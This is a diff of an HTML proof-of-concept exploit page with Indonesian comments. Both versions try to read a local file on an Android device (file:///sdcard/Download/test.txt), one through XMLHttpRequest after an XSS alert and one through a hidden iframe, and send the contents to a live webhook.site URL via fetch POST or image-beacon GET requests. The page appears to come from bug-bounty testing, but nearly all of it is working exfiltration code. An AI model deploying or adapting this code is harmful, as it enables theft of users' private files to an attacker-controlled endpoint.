@@ -1,102 +1,45 @@
-<!DOCTYPE html>
-<html lang="id">
+                <!DOCTYPE html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Data Exfiltration - Bug 2036289</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            padding: 20px;
-            background-color: #f4f4f9;
-            color: #333;
-            text-align: center;
-        }
-        .container {
-            border: 1px solid #ddd;
-            padding: 20px;
-            border-radius: 8px;
-            background: #fff;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-            display: inline-block;
-            margin-top: 50px;
-        }
-        .status {
-            font-weight: bold;
-            color: #d9534f;
-        }
-    </style>
+    <title>Bypass PoC - Iframe Method</title>
 </head>
 <body>
-
-    <div class="container">
-        <h2>PoC Eksploitasi Pembacaan File Lokal</h2>
-        <p>Status Pengujian: <span id="status-text" class="status">Memulai pengujian...</span></p>
-    </div>
+    <h3>Menguji Bypass via Iframe...</h3>
+    
+    <iframe id="targetFrame" src="file:///sdcard/Download/test.txt" style="display:none;"></iframe>
 
     <script>
-        // Konfigurasi Target dan Webhook kamu
-        const targetFile = 'file:///sdcard/Download/test.txt';
         const webhookUrl = 'https://webhook.site/8020a520-ac20-474c-bb29-35cf02751528';
-        const statusEl = document.getElementById('status-text');
 
         window.onload = function() {
-            // Jalankan Alert awal untuk memastikan XSS aktif di konteks ini
-            alert("XSS Berhasil di Domain: media\n\nMencoba membaca file lokal...");
-
-            // Inisialisasi AJAX untuk membaca file lokal
-            var xhr = new XMLHttpRequest();
-            
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4) {
-                    // Status 0 biasa terjadi pada skema file:// jika sukses
-                    if (xhr.status == 200 || xhr.status == 0) {
-                        var fileContent = xhr.responseText;
-                        statusEl.innerText = "File berhasil dibaca! Mengirim data ke Webhook...";
-                        statusEl.style.color = "#5cb85c";
-
-                        // Kirim data yang berhasil dicuri ke Webhook.site milikmu
-                        sendToWebhook(fileContent);
+            // Berikan jeda 1 detik agar iframe selesai memuat file secara sempurna
+            setTimeout(function() {
+                try {
+                    var frame = document.getElementById('targetFrame');
+                    // Mengakses konten teks di dalam iframe
+                    var stolenData = frame.contentWindow.document.body.innerText || frame.contentDocument.body.innerText;
+                    
+                    if (stolenData) {
+                        alert("Iframe Berhasil Membaca! Mengirim data...");
+                        sendExfil(stolenData);
                     } else {
-                        statusEl.innerText = "Gagal membaca file. Status: " + xhr.status;
-                        sendErrorToWebhook("Gagal membaca file. Status: " + xhr.status);
+                        sendError("Iframe termuat tapi konten kosong.");
                     }
+                } catch (e) {
+                    sendError("Iframe terblokir SOP: " + e.message);
                 }
-            };
-
-            try {
-                xhr.open('GET', targetFile, true);
-                xhr.send();
-            } catch (e) {
-                statusEl.innerText = "Terblokir Kebijakan SOP/Sandbox: " + e.message;
-                sendErrorToWebhook("Terblokir SOP: " + e.message);
-            }
+            }, 1000);
         };
 
-        // Fungsi untuk Exfiltration Data
-        function sendToWebhook(data) {
-            fetch(webhookUrl, {
-                method: 'POST',
-                mode: 'cors',
-                headers: {
-                    'Content-Type': 'text/plain',
-                },
-                body: "STOLEN_DATA: " + data
-            }).then(() => {
-                alert("Data Berhasil Dikirim ke Webhook!");
-            }).catch((err) => {
-                // Jika POST diblokir, coba kirim via metode GET (Query Parameter)
-                var img = new Image();
-                img.src = webhookUrl + "?exfil=" + encodeURIComponent(data);
-            });
+        function sendExfil(data) {
+            var img = new Image();
+            img.src = webhookUrl + "?method=iframe&data=" + encodeURIComponent(data);
         }
 
-        // Fungsi untuk mencatat log error di Webhook kamu (untuk debugging)
-        function sendErrorToWebhook(errorMsg) {
+        function sendError(msg) {
             var img = new Image();
-            img.src = webhookUrl + "?error=" + encodeURIComponent(errorMsg);
+            img.src = webhookUrl + "?method=iframe_err&msg=" + encodeURIComponent(msg);
         }
     </script>
-
 </body>
 </html>
